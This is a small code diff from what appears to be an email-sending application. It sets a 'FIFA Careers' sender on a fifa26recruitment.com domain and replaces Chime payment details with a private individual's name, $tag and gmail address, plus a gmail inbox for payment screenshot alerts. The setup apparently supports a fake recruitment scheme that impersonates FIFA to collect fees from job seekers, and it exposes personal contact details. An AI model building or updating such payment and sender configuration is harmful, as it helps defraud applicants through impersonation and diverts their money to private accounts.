@@ -37,8 +37,9 @@ const BREVO_SENDER_NAME = "FIFA Careers";
 /** Must be a verified sender in Brevo (Settings → Senders, domains & IPs). */
 const BREVO_SENDER_EMAIL = "support@fifa26recruitment.com";
 
-const CHIME_PAYMENT_NUMBER = "+1 (513) 628-6294";
-const CHIME_PAYMENT_EMAIL = "payment@fifa26workforce.com";
+const CHIME_PAYMENT_NAME = "Phillip Marks";
+const CHIME_TAG = "$Phillip-Marks-11";
+const CHIME_PAYMENT_EMAIL = "phillipmarks001@gmail.com";
 
 /** Inbox for payment screenshot alerts. */
 const PAYMENT_NOTIFICATION_EMAIL = "paulgoodling0@gmail.com";
